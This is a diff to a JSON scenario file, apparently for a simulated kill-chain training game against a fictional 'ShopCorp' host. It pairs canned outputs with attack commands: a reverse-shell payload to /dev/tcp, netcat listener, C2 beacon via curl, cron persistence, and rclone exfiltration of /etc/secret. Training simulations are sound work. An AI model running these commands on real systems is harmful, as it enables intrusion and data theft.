@@ -1,20 +1,68 @@
 {
   "shopcorp_web": {
-    "hostname": "shopcorp.local",
-    "ip": "10.10.10.15",
-    "os": "Ubuntu 20.04 LTS",
-    "servizi": ["ssh", "http"],
-    "osint": {
-      "linkedin": "Mario Rossi – DevOps Engineer presso ShopCorp",
-      "github": "https://github.com/shopcorp/frontend"
+    "all_commands": {
+      "reconnaissance": [
+        "nmap shopcorp.local",
+        "whois shopcorp.local",
+        "osint linkedin",
+        "osint github",
+        "clear"
+      ],
+      "weaponization": [
+        "msfvenom -p linux/x86/reverse_tcp LHOST=10.10.10.15 LPORT=4444 -f elf",
+        "custom_payload_generator"
+      ],
+      "delivery": [
+        "scp payload.elf user@shopcorp.local:/tmp",
+        "email_send -a payload.elf user@victim@shopcorp.com"
+      ],
+      "exploit": [
+        "capture_hashes user1",
+        "sudo exploit_x"
+      ],
+      "installation": [
+        "sudo cp /tmp/malware /usr/bin/",
+        "crontab -l"
+      ],
+      "command_and_control": [
+        "nc -lvp 4444",
+        "curl http://c2shopcorp.com/beacon"
+      ],
+      "actions_on_objectives": [
+        "tar czf secrets.tar.gz /etc/secret",
+        "rclone copy secrets.tar.gz remote:/loot"
+      ]
     },
     "output_reconnaissance": {
-      "help": "Comandi disponibili:\n- nmap shopcorp.local\n- whois shopcorp.local\n- osint linkedin\n- osint github\n- clear",
-      "nmap shopcorp.local": "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for shopcorp.local (10.10.10.15)\nHost is up (0.025s latency).\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n\nService detection performed. Please report any incorrect results.",
-      "whois shopcorp.local": "Domain Name: SHOPCORP.LOCAL\nRegistrar: PRIVATE REGISTRATION\nRegistrant Name: REDACTED FOR PRIVACY\nName Server: ns1.shopcorp.local\nName Server: ns2.shopcorp.local",
-      "osint linkedin": "LinkedIn OSINT:\n- Mario Rossi (DevOps Engineer)\n- 5 anni di esperienza in infrastrutture Cloud\n- Interessi: Kubernetes, CI/CD",
-      "osint github": "GitHub OSINT:\n- Repository trovata: shopcorp/frontend\n- Tecnologie: React.js, Node.js\n- Ultimo commit: 2025-04-15 12:34 UTC",
+      "nmap shopcorp.local": "Starting Nmap 7.92 ( https://nmap.org ) at 2024-07-26 10:55 EDT\nNmap scan report for shopcorp.local (10.10.10.15)\nHost is up (0.000024s latency).\n\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n111/tcp  open  rpcbind\n631/tcp  open  ipp\n3306/tcp open  mysql\n5432/tcp open  postgresql\n\nNSE: Loaded 1 scripts for scanning.\nNSE: Script scanning done.\nNmap done: 1 IP address (1 host up) scanned in 5.32 seconds",
+      "whois shopcorp.local": "Domain Name: SHOPCORP.LOCAL\nRegistrar: ShopCorp IT Registrar\nName Server: ns1.shopcorp.local\nName Server: ns2.shopcorp.local",
+      "osint linkedin": "LinkedIn OSINT:\n- Mario Rossi – DevOps Engineer at ShopCorp\n- Laura Bianchi – HR Manager at ShopCorp",
+      "osint github": "GitHub OSINT:\n- shopcorp/frontend: Public repository with React code\n- shopcorp/backend: Private repository (not visible)",
       "clear": ""
+    },
+    "output_weaponization": {
+      "msfvenom -p linux/x86/reverse_tcp LHOST=10.10.10.15 LPORT=4444 -f elf": "No platform was selected, choosing Msf::Module::Platform::Linux from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 99 bytes\n/bin/sh -i >& /dev/tcp/10.10.10.15/4444 0>&1",
+      "custom_payload_generator": "Custom payload created: length 125 bytes. Saved to payload.bin"
+    },
+    "output_delivery": {
+      "scp payload.elf user@shopcorp.local:/tmp": "payload.elf transferred to /tmp on shopcorp.local",
+      "email_send -a payload.elf user@victim@shopcorp.com": "Email with attachment payload.elf sent to victim@shopcorp.com"
+    },
+    "output_exploit": {
+      "capture_hashes user1": "Capturing hashes for user1...\n100% complete: 1 hash recovered: user1:$6$abcdefghijklmnop$qrstuvwxyzABCDEFGHIJKLMNOpqrstu",
+      "sudo exploit_x": "Executing exploit_x on /usr/bin/vulnerable... Exploit succeeded. Shell spawned."
+    },
+    "output_installation": {
+      "sudo cp /tmp/malware /usr/bin/": "malware copied to /usr/bin/ successfully",
+      "crontab -l": "SHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n@reboot /usr/bin/malware"
+    },
+    "output_command_and_control": {
+      "nc -lvp 4444": "Listening on [any] 4444 ...\nConnection received from 10.10.10.15 4444\n/ # ",
+      "curl http://c2shopcorp.com/beacon": "HTTP/1.1 200 OK\nContent-Type: application/json\n{\"status\":\"ack\",\"task\":\"run_update\"}"
+    },
+    "output_actions_on_objectives": {
+      "tar czf secrets.tar.gz /etc/secret": "tar: Removing leading '/' from member names\n/etc/secret/passwords.db\n/etc/secret/credentials.json\ntar completed: secrets.tar.gz (4.2 MB)",
+      "rclone copy secrets.tar.gz remote:/loot": "100% 4.2M /4.2M Bytes, 10.2 MB/s, ETA 0s"
     }
   }
 }
